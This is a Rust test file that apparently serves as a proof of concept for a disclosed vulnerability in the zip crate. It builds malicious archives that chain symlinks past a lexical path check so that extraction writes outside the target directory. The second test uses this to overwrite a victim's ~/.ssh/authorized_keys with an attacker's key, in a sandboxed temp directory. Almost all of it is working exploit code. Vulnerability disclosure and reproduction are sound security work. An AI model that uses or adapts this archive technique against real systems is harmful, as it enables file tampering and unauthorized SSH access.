//! PoC for Linux: Write outside the extraction directory via symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! Mechanism: The symlink target validation is lexical (prefix matching in `simplified_components`)
//! By placing an outward-pointing symlink `b` as an "intermediate component in the resolved path", `b` is traversed by the OS rather than the validation loop, thus escaping outside without being verified.
//! Can be reproduced with `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::{Cursor, Write};
use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Verification of writing a new file outside the extraction destination
#[test]
fn zip_slip_via_symlink() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination
    let outside = tmp.path().join("outside"); // A location where writing should not be allowed
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Symlink pointing outside (target is created unverified)
    zip.add_symlink("b", outside.to_str().unwrap(), opt).unwrap();
    // a: Symlink whose target starts under dest (passes lexical validation)
    zip.add_symlink("a", dest.join("b/sub").to_str().unwrap(), opt).unwrap();
    // a/pwned.txt: File that escapes outside dest by traversing the intermediate b
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    ZipArchive::from(archive).extract(&dest).unwrap();

    // Verification: File has been written outside dest
    let escaped = outside.join("sub/pwned.txt");
    assert!(escaped.exists(), "escape failed");
    assert_eq!(fs::read_to_string(&escaped).unwrap(), "escaped!");
    println!("wrote outside dest: {}", escaped.display());
}

/// Verification of overwriting an existing file (~/.ssh/authorized_keys) outside the extraction destination
#[test]
fn overwrite_existing_ssh_authorized_keys() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination

    // Reproduce victim's existing ~/.ssh/authorized_keys (containing a legitimate key)
    let home = tmp.path().join("home_victim");
    let ssh = home.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let authorized_keys = ssh.join("authorized_keys");
    fs::write(&authorized_keys, "ssh-ed25519 AAAA...LEGIT victim@host\n").unwrap();
    let original = fs::read_to_string(&authorized_keys).unwrap();

    fs::create_dir(&dest).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Outward-pointing symlink to victim's HOME (target unverified)
    // Because it's placed in the middle rather than at the end, the OS traverses it transparently, bypassing validation
    zip.add_symlink("b", home.to_str().unwrap(), opt).unwrap();
    // a: Symlink pointing to <dest>/b/.ssh (passes validation because it is lexically under dest)
    zip.add_symlink("a", dest.join("b/.ssh").to_str().unwrap(), opt).unwrap();
    // a/authorized_keys: File entry that reaches the actual authorized_keys
    zip.start_file("a/authorized_keys", opt).unwrap();
    zip.write_all(b"ssh-ed25519 AAAA...ATTACKER attacker@evil\n").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    // extract() returns Ok(()) without an error (the caller cannot detect it)
    let res = ZipArchive::from(archive).extract(&dest);
    println!("extract() returned: {:?}", res);
    res.unwrap();

    // Verification: Existing file is overwritten with the attacker's content
    let after = fs::read_to_string(&authorized_keys).unwrap();
    println!("--- BEFORE ---\n{original}--- AFTER ---\n{after}");
    assert_ne!(after, original, "file was NOT overwritten");
    assert!(after.contains("ATTACKER"), "attacker content not present");
    println!("OVERWROTE existing file: {}", authorized_keys.display());
}
